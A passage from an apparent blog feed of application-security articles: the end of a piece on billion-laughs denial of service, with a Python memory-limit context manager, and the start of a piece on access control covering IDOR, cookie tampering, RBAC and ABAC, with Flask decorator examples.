&lt;li&gt;&lt;strong&gt;No evaluation of references&lt;/strong&gt;: Throwing the dangerous feature out of the window for sure means that you&amp;rsquo;re not vulnerable to the attack anymore. You need to make sure it doesn&amp;rsquo;t affect your users, though. Communicating this might be hard.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Reference recursion depth limit&lt;/strong&gt;: The parser itself could be aware of this issue and have a threshold when it stops evaluating references. However, this might also lead to false-positives &amp;mdash; documents that get not parsed, because the parser thinks it&amp;rsquo;s an attack.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;RAM restriction&lt;/strong&gt;: You can run the code that might execute the billion laughs attack under resource restrictions. This means the execution thread/process receives a (catchable) exception and can continue execution normally. It might especially mean that even if the exception is not thrown, the rest of your system might be fine. Only that thread/process might be killed.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So, how do you do this with Python?&lt;/p&gt;
&lt;p&gt;The resource restriction is easiest:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;resource&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;contextlib&lt;/span&gt;


&lt;span class="nd"&gt;@contextlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;contextmanager&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;limit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;resource_type&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;limit&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="sd"&gt;"""Temporarily limit a resource."""&lt;/span&gt;
    &lt;span class="n"&gt;soft_limit&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;hard_limit&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;resource&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getrlimit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;resource_type&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;resource&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setrlimit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;resource_type&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;limit&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;hard_limit&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  &lt;span class="c1"&gt;# set soft limit&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;yield&lt;/span&gt;
    &lt;span class="k"&gt;finally&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;resource&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setrlimit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;resource_type&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;soft_limit&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;hard_limit&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  &lt;span class="c1"&gt;# restore&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;dangerous_call&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;


&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;limit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;resource&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RLIMIT_AS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;dangerous_call&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;MemoryError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"Your call consumed too much memory!"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Restricting the parser is sometimes possible, sometimes not. It depends on your
parser. Some have parameters like resolve_entities
(&lt;a href="https://lxml.de/api/lxml.etree.XMLParser-class.html"&gt;lxml&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;Limiting the maximum decompression size was done against the HTTP/2 &amp;ldquo;HPACK&amp;rdquo;
bomb
(&lt;a href="https://python-hyper.org/projects/hpack/en/latest/security/CVE-2016-6581.html#the-solution"&gt;source&lt;/a&gt;).&lt;/p&gt;
&lt;h2 id="see-also"&gt;See also&lt;/h2&gt;
&lt;p&gt;Kate Murphey wrote an awesome article about git bombs, check it out!
&lt;a href="https://kate.io/blog/git-bomb/"&gt;&lt;strong&gt;Exploding Git Repositories&lt;/strong&gt;
&lt;em&gt;If you are an adventurous sort (and can handle a potential reboot) I invite you to clone this tiny repo: $ git clone&amp;hellip;&lt;/em&gt;kate.io&lt;/a&gt;&lt;/p&gt;
&lt;h2 id="whats-next"&gt;What&amp;rsquo;s next?&lt;/h2&gt;
&lt;p&gt;In this series about application security (AppSec) we already explained some of the techniques of the attackers üòà and also techniques of the defenders üòá:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Part 1: &lt;a href="https://medium.com/faun/sql-injections-e8bc9a14c95"&gt;SQL Injections&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 2: &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;Don&amp;rsquo;t leak Secrets&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 3: &lt;a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"&gt;Cross-Site Scripting (XSS)&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 4: &lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) üòá&lt;/li&gt;
&lt;li&gt;Part 9: &lt;a href="https://medium.com/faun/xxe-attacks-750e91448e8f"&gt;XXE attacks&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 10: &lt;a href="https://levelup.gitconnected.com/effective-access-control-331f883cb0ff"&gt;Effective Access Control&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 11: &lt;a href="https://medium.com/bugbountywriteup/dos-via-a-billion-laughs-9a79be96e139"&gt;DOS via a Billion Laughs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 12: &lt;a href="https://medium.com/faun/full-disk-encryption-2090489f9760"&gt;Full Disk Encryption&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 13: &lt;a href="https://medium.com/bugbountywriteup/insecure-deserialization-5c64e9943f0e"&gt;Insecure Deserialization&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 14: &lt;a href="https://levelup.gitconnected.com/docker-security-5f4df118948c"&gt;Docker Security&lt;/a&gt; üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And this is about to come:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CSRF üòà&lt;/li&gt;
&lt;li&gt;DOS üòà&lt;/li&gt;
&lt;li&gt;ReDoS üòà&lt;/li&gt;
&lt;li&gt;Credential Stuffing üòà&lt;/li&gt;
&lt;li&gt;Cryptojacking üòà&lt;/li&gt;
&lt;li&gt;Single-Sign-On üòá&lt;/li&gt;
&lt;li&gt;Two-Factor Authentication üòá&lt;/li&gt;
&lt;li&gt;Backups üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="InfoSec"></category><category term="AppSec"></category><category term="Security"></category><category term="Cybersecurity"></category></entry><entry><title>Effective Access Control üòá</title><link href="https://martin-thoma.com/https://levelup.gitconnected.com/effective-access-control-331f883cb0ff" rel="alternate"></link><published>2020-12-23T20:00:00+01:00</published><updated>2020-12-23T20:00:00+01:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2020-12-23:/https://levelup.gitconnected.com/effective-access-control-331f883cb0ff</id><summary type="html">&lt;p&gt;Access control is the act of restricting access to a selected group of people or systems. That group is authorized to access the system. To check if a person is authorized to access, the person typically has to be authenticated.&lt;/p&gt;
&lt;p&gt;In this article, I focus on web services. Access to ‚Ä¶&lt;/p&gt;</summary><content type="html">&lt;p&gt;Access control is the act of restricting access to a selected group of people or systems. That group is authorized to access the system. To check if a person is authorized to access, the person typically has to be authenticated.&lt;/p&gt;
&lt;p&gt;In this article, I focus on web services. Access to physical systems like your notebook / full disk encryption is a different story. And access to buildings/tailgating is yet another story.&lt;/p&gt;
&lt;p&gt;In the context of access control, one typically speaks of those entities:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Subjects&lt;/strong&gt;: People like my girlfriend/Obama/my neighbor; organizations like
  the NSA; companies like Github/Google/Facebook; software like bots&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Objects&lt;/strong&gt;: Partitions, files, databases, database schemas, database tables, &amp;hellip;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Rights&lt;/strong&gt;: Read, write, modify/alter, delete, add/insert, append, enter, execute, &amp;hellip;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For example, my girlfriend has permission to enter my house. In this case, my
girlfriend is the subject, the object is &amp;ldquo;house&amp;rdquo; and the right is &amp;ldquo;enter&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;In this article, you will get to know how access control can be broken,
different types of access control, and finally some tricks for effective access
control. Let&amp;rsquo;s start!&lt;/p&gt;
&lt;h2 id="how-can-access-control-be-broken"&gt;How can access control be broken?&lt;/h2&gt;
&lt;p&gt;Many things can go wrong in access control and some of them are very hard to
automatically check. This is the reason why broken access Control (BAC) is
&lt;a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control"&gt;number 4 in OWASP TOP-10
2017&lt;/a&gt;.&lt;/p&gt;
&lt;h3 id="hiding-a-system-isnt-secure"&gt;Hiding a system isn&amp;rsquo;t secure&lt;/h3&gt;
&lt;p&gt;The (implicit) assumption that some systems or data don&amp;rsquo;t need access control,
because they are never (purposely) exposed to the public is a common mistake.
I&amp;rsquo;m thinking here of AWS S3 buckets where people let just everybody upload. The
thought here is that people need to know the name of the bucket and no one
would just try &lt;code&gt;s3://company-data&lt;/code&gt; or similar.&lt;/p&gt;
&lt;p&gt;Another attack that goes in this direction is called &lt;strong&gt;insecure direct object
reference (IDOR)&lt;/strong&gt;. Imagine you wanted to download an invoice from Amazon and
found that it downloaded it fromhttps://amazon.com/invoice/1234/invoice.pdf .
Wouldn&amp;rsquo;t you be curious about what
&lt;a href="https://amazon.com/invoice/1234/invoice.pdf"&gt;https://amazon.com/invoice/1233/invoice.pdf&lt;/a&gt;
contained? It could very well be that this would be an invoice of a different
person. And it could be that there is no more access control performed.&lt;/p&gt;
&lt;h3 id="forgetting-to-apply-access-control"&gt;Forgetting to apply access control&lt;/h3&gt;
&lt;p&gt;Many backend systems have dozens of routes. All of them need to apply access
control. It depends on the implementation of your access control system, but it
could be that you need to add code to every route which is not public. This
makes it easy to forget. And to miss it in a code review that it was forgotten.
Even if all people agree that the route needs access control.&lt;/p&gt;
&lt;h3 id="client-side-access-control"&gt;Client-side access control&lt;/h3&gt;
&lt;p&gt;&lt;img alt="Age verification for adult content is a typical example of client-side access control. Image by the author." src="https://cdn-images-1.medium.com/max/2400/1*vtfvTaqe3QLcjA2v0Mh0vQ.png"/&gt;&lt;em&gt;Age verification for adult content is a typical example of client-side access control. Image by the author.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;I haven&amp;rsquo;t seen client-side access control in a long time, but please don&amp;rsquo;t forget: Access control needs to be done server-side. I have never seen effective client-side access control for web systems.&lt;/p&gt;
&lt;h3 id="trusting-the-client"&gt;Trusting the client&lt;/h3&gt;
&lt;p&gt;Authentication typically means that the user needs to enter a username/email
and a password. Then the server creates either a session or a token to remember
that user. We don&amp;rsquo;t want the user to have to authenticate again and again.&lt;/p&gt;
&lt;p&gt;Typically, there are at least 3 levels of users:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Anonymous users&lt;/li&gt;
&lt;li&gt;Registered users&lt;/li&gt;
&lt;li&gt;Admins&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The admins are also registered but have more privileges than all other users.
The system needs a way to distinguish the admin from normal users.&lt;/p&gt;
&lt;p&gt;Sometimes, this is done with an unsigned cookie. Hence we store the information
if the user is an admin at the client. Non-malicious users will not tamper with
that information and thus the browser tells us with every request &amp;ldquo;I&amp;rsquo;m not an
admin&amp;rdquo;. But malicious users can change that cookie. By changing the is_admin
cookie from &lt;code&gt;is_admin=false&lt;/code&gt; to &lt;code&gt;is_admin=true&lt;/code&gt; they perform a &lt;strong&gt;privilege
escalation&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;There are two typical ways around it:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Cryptographically sign this information and check the signature with every request&lt;/li&gt;
&lt;li&gt;Store that information on the server and look it up when you receive the
  cryptographically signed user id.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Storing the information on the client has the advantage that you might be able
to save some requests to the database.&lt;/p&gt;
&lt;p&gt;Storing the information on the server has the advantage that a loss in
privileges will instantly be effective.&lt;/p&gt;
&lt;h3 id="missing-expiration-date"&gt;Missing Expiration Date&lt;/h3&gt;
&lt;p&gt;Imagine this: Your company has a system for employees. Most employees can only
see their payslip, but team leads can also see the payslip of their team. Team
leads also can give rewards to well-performing employees. You are a team lead.
You use that system daily and you never log-out. At some point, you get a
promotion. You are no longer a team lead, though. Hence you should no longer be
able to see your former team's payslips. But you do.&lt;/p&gt;
&lt;p&gt;If the system stores the authorization and the role in a token that never
expires on the client, the client could use that token forever. As some of your
systems might rely on that token being correct, they never check another
source. The cryptographic signature is right and thus the token is trustworthy.
And it was. Until the contained information changed.&lt;/p&gt;
&lt;h3 id="broken-authentication-control"&gt;Broken Authentication Control&lt;/h3&gt;
&lt;p&gt;If you can authenticate as another user, you will get all rights of that user.
It&amp;rsquo;s not really broken access control but has the same effect. I&amp;rsquo;ll write a
couple of articles about authentication:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Multi-factor authentication &amp;mdash; yet to be written!&lt;/li&gt;
&lt;li&gt;Single-sign on &amp;mdash; it&amp;rsquo;s on my list, buddy ü§û&lt;/li&gt;
&lt;li&gt;OAuth and OpenID &amp;mdash; you guessed it&amp;hellip; it&amp;rsquo;s on the way üòÖ&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="access-control-policies_1"&gt;Access Control Policies&lt;/h2&gt;
&lt;p&gt;The following access control policies deal with slightly different problems.
I&amp;rsquo;m not talking about specific technologies here, but the abstract concepts
which many implementations use.&lt;/p&gt;
&lt;h3 id="discretionary-access-control-dac"&gt;&lt;strong&gt;Discretionary Access Control (DAC)&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;You can formally store all rights as tuples (Subject, Object, Right). You can
store those tuples either as a matrix or as a list of tuples. Or you can do it
object-centric and store a list of all subjects with their rights. For example,
for the file foobar.txt you could store &lt;code&gt;Alice:read,write; Bob:read&lt;/code&gt;. This is
called an &lt;strong&gt;Access Control List (ACL)&lt;/strong&gt;. You can also store that information
subject-centric: For each user, store what the user can do. That is called a
&lt;strong&gt;Capability List (C-List)&lt;/strong&gt;. It&amp;rsquo;s still the same information, but another data
structure.&lt;/p&gt;
&lt;p&gt;The &amp;ldquo;discretionary&amp;rdquo; part is that the users are allowed to change the
permissions of an object.&lt;/p&gt;
&lt;h3 id="mandatory-access-control-mac"&gt;&lt;strong&gt;Mandatory Access Control (MAC)&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;In the case of DAC, the rights did not have any relation to each other. This is
different in MAC. For MAC, the rights are ordered: &lt;code&gt;Public &amp;lt; confidential &amp;lt;
secret &amp;lt;top secret&lt;/code&gt;. Users have a clearance and objects have a classification.
If Bob has a &amp;ldquo;secret&amp;rdquo; clearance, he is allowed to read documents that are
classified as &amp;ldquo;secret&amp;rdquo;, &amp;ldquo;confidential&amp;rdquo;, or &amp;ldquo;public&amp;rdquo;. MAC is used by SELinux and
AppArmor.&lt;/p&gt;
&lt;p&gt;In contrast to DAC, in the MAC case users are not allowed to change the
permissions. The permissions are set by the system administrator.&lt;/p&gt;
&lt;h3 id="role-based-access-control-rbac"&gt;&lt;strong&gt;Role-based Access Control (RBAC)&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;Assigning permissions to subjects directly might be a lot of administrative
work. Instead, you can create a role, e.g. &amp;ldquo;team lead&amp;rdquo;, &amp;ldquo;quality assurance&amp;rdquo;,
&amp;ldquo;developer&amp;rdquo;, &amp;ldquo;accounting&amp;rdquo;, &amp;ldquo;CTO&amp;rdquo;. Every subject can have an arbitrary amount of
roles. Roles have rights for objects. For example, for the &amp;ldquo;others salary&amp;rdquo; the
role &amp;ldquo;CTO&amp;rdquo; might have the right to &amp;ldquo;read&amp;rdquo; and &amp;ldquo;edit&amp;rdquo; it. For a given object,
the rights of a subject are the set of all rights of all roles that the user
has. RBAC is used by all content management systems (CMS) I know. Famous
examples are Wikipedia, Reddit, and StackExchange.&lt;/p&gt;
&lt;p&gt;To apply RBAC, you need a role table (could also be called group ) and a table
that connects users with groups:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Image by author" src="https://cdn-images-1.medium.com/max/2000/1*XT6bjGvqQR9DNciLRlUXFA.png"/&gt;&lt;em&gt;Image by author&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Then you need to get all roles a user has:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;role_id&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;role_user&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;user_id&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="k"&gt;current_user&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You might want to cache this query as you will execute it a lot and the roles
might not change that quickly.&lt;/p&gt;
&lt;p&gt;The last ingredient is to store an access control list per route. In Flask, it
could look like this with &lt;a href="https://pypi.org/project/Flask-User/"&gt;Flask-User&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nd"&gt;@app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;route&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"/analytics"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;methods&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"GET"&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="nd"&gt;@roles_required&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"admin"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;analytics_route&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;"some"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"analytics_data"&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;When this route is called, the &lt;code&gt;@roles_required&lt;/code&gt; decorator first executes the
access control code. If the user doesn&amp;rsquo;t have access, the rest is ignored and
an exception is thrown or an error response is returned.&lt;/p&gt;
&lt;p&gt;RBAC can be combined with either DAC or MAC. For web applications, it&amp;rsquo;s typical
that the objects (the routes) have some fixed roles they require. Only the
developers can change them. They are fixed in the code, not in a database. The
decorator &lt;code&gt;@roles_required("admin")&lt;/code&gt; here is an ACL.&lt;/p&gt;
&lt;h3 id="attribute-based-access-control-abac"&gt;&lt;strong&gt;Attribute-based Access Control (ABAC)&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;One part that is missing for RBAC is context. You want to use the relationship
between the subject and the object, e.g. if the subject is the creator of that
object it might automatically grant the subject some rights. Or depending on
the time or location, the rights might change. For example, normal employees
might not be allowed to access the office between 11 pm and 5 am.&lt;/p&gt;
&lt;p&gt;We don&amp;rsquo;t want to fire too many requests against our database, give meaningful
error responses, and not repeat code. A good compromise could be this pattern:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nd"&gt;@app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;route&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"/article/&amp;lt;article_id&amp;gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;methods&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"PATCH"&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;  &lt;span class="c1"&gt;# execute (1)&lt;/span&gt;
&lt;span class="nd"&gt;@get_article&lt;/span&gt;  &lt;span class="c1"&gt;# execute (2)&lt;/span&gt;
&lt;span class="nd"&gt;@attribute_required&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;is_author&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c1"&gt;# execute (3)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;edit_article&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;article&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Article&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  &lt;span class="c1"&gt;# execute (4)&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;  &lt;span class="c1"&gt;# update the article&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The get_article decorator simply uses the ORM:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;typing&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Any&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Callable&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;functools&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;wraps&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_article&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Callable&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Callable&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="sd"&gt;"""&lt;/span&gt;
&lt;span class="sd"&gt;    Make the variable "article" available.&lt;/span&gt;

&lt;span class="sd"&gt;    Parameters&lt;/span&gt;
&lt;span class="sd"&gt;    ----------&lt;/span&gt;
&lt;span class="sd"&gt;    func : Callable&lt;/span&gt;
&lt;span class="sd"&gt;        Needs to have an 'article' keyword parameter.&lt;/span&gt;

&lt;span class="sd"&gt;    Returns&lt;/span&gt;
&lt;span class="sd"&gt;    -------&lt;/span&gt;
&lt;span class="sd"&gt;    modified_func : Callable&lt;/span&gt;
&lt;span class="sd"&gt;        A function where the parameter 'article' is added to&lt;/span&gt;
&lt;span class="sd"&gt;        the signature&lt;/span&gt;
&lt;span class="sd"&gt;    """&lt;/span&gt;

    &lt;span class="nd"&gt;@wraps&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;wrapper&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Any&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Any&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;article_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"article_id"&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="n"&gt;article&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_article_from_db&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;article_id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"article"&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;article&lt;/span&gt;
